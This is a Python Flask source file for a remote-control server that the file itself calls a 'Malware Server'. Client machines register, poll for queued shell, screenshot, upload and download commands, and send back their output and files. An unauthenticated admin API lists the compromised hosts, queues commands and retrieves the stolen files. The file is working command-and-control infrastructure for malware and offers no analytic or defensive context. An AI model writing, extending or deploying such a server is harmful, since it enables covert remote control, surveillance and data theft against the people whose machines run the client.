import os
import uuid
import time
from datetime import datetime
from flask import Flask, request, jsonify, send_file
from werkzeug.utils import secure_filename

app = Flask(__name__)

# --- Global State (In-Memory) ---
# In a real production app, use a database (Redis/SQLite/Postgres)
# clients = {
#   "client_id": {
#       "ip": "1.2.3.4",
#       "last_seen": <timestamp>,
#       "command_queue": [ {"id": "uid", "cmd": "..."} ],
#       "results": { "cmd_uid": "result_data" }
#   }
# }
clients = {}

# Folder to store uploaded files
UPLOAD_FOLDER = 'uploads'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

# --- Helpers ---

def clean_clients():
    """Remove dead clients (inactive > 60s)"""
    now = time.time()
    dead = []
    for cid, data in clients.items():
        if now - data['last_seen'] > 60:
            dead.append(cid)
    for d in dead:
        del clients[d]

# --- Client API Endpoints ---

@app.route('/api/register', methods=['POST'])
def register():
    """Client first check-in"""
    ip = request.remote_addr
    # Try to keep same ID if provided, else new
    data = request.json or {}
    client_id = data.get('id')
    
    if not client_id or client_id not in clients:
        client_id = str(uuid.uuid4())[:8]
        
    clients[client_id] = {
        "ip": ip,
        "last_seen": time.time(),
        "command_queue": [],
        "results": {}
    }
    
    print(f"[+] Client registered: {client_id} from {ip}")
    return jsonify({"id": client_id, "status": "registered"})

@app.route('/api/poll', methods=['POST'])
def poll():
    """Client checks for commands"""
    data = request.json or {}
    client_id = data.get('id')
    
    if not client_id or client_id not in clients:
        return jsonify({"error": "Unknown client, re-register"}), 404
        
    # Update heartbeat
    clients[client_id]['last_seen'] = time.time()
    
    # Check queue
    queue = clients[client_id]['command_queue']
    if queue:
        # Pop one command
        cmd = queue.pop(0)
        return jsonify({"command": cmd})
    
    return jsonify({"command": None})

@app.route('/api/result', methods=['POST'])
def result():
    """Client sends result of a command"""
    data = request.json or {}
    client_id = data.get('id')
    cmd_id = data.get('cmd_id')
    output = data.get('output')
    
    if not client_id or client_id not in clients:
        return jsonify({"error": "Unknown client"}), 404
        
    if cmd_id:
        clients[client_id]['results'][cmd_id] = output
        print(f"[*] Result received for {cmd_id} from {client_id}")
        
    return jsonify({"status": "ok"})

@app.route('/api/upload', methods=['POST'])
def upload_file():
    """Client uploads a file (screenshot or downloaded file)"""
    client_id = request.form.get('id')
    cmd_id = request.form.get('cmd_id')
    
    if not client_id or client_id not in clients:
        return jsonify({"error": "Unknown client"}), 404
        
    if 'file' not in request.files:
        return jsonify({"error": "No file part"}), 400
        
    file = request.files['file']
    if file.filename == '':
        return jsonify({"error": "No selected file"}), 400
        
    # Save file
    filename = secure_filename(f"{client_id}_{int(time.time())}_{file.filename}")
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    file.save(filepath)
    
    # Store the filename/path as the result for the admin to retrieve later
    if cmd_id:
        clients[client_id]['results'][cmd_id] = f"FILE_UPLOADED:{filename}"
        
    return jsonify({"status": "uploaded", "filename": filename})

# --- Admin API Endpoints ---

@app.route('/admin/list', methods=['GET'])
def admin_list():
    """List active clients"""
    clean_clients()
    active = []
    for cid, data in clients.items():
        active.append({
            "id": cid,
            "ip": data['ip'],
            "last_seen": int(time.time() - data['last_seen'])
        })
    return jsonify(active)

@app.route('/admin/command', methods=['POST'])
def admin_command():
    """Admin schedules a command"""
    data = request.json or {}
    target_id = data.get('target_id')
    cmd_type = data.get('type') # 'shell', 'screen', 'upload', 'download'
    cmd_params = data.get('params', "")
    
    if not target_id or target_id not in clients:
        return jsonify({"error": "Client not found"}), 404
        
    cmd_id = str(uuid.uuid4())[:8]
    command = {
        "id": cmd_id,
        "type": cmd_type,
        "params": cmd_params
    }
    
    clients[target_id]['command_queue'].append(command)
    return jsonify({"cmd_id": cmd_id, "status": "queued"})

@app.route('/admin/response/<cmd_id>', methods=['GET'])
def admin_response(cmd_id):
    """Admin polls for result of specific command"""
    # Search all clients for this cmd_id result
    # Inefficient for many clients, but fine for small scale
    for cid, data in clients.items():
        if cmd_id in data['results']:
            res = data['results'].pop(cmd_id) # Consume result
            return jsonify({"status": "done", "output": res})
            
    return jsonify({"status": "pending"})

@app.route('/admin/download_file/<filename>', methods=['GET'])
def admin_download(filename):
    """Admin downloads a file uploaded by client"""
    return send_file(os.path.join(app.config['UPLOAD_FOLDER'], secure_filename(filename)))

@app.route('/')
def index():
    return "Malware Server Running. Use Admin Client."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
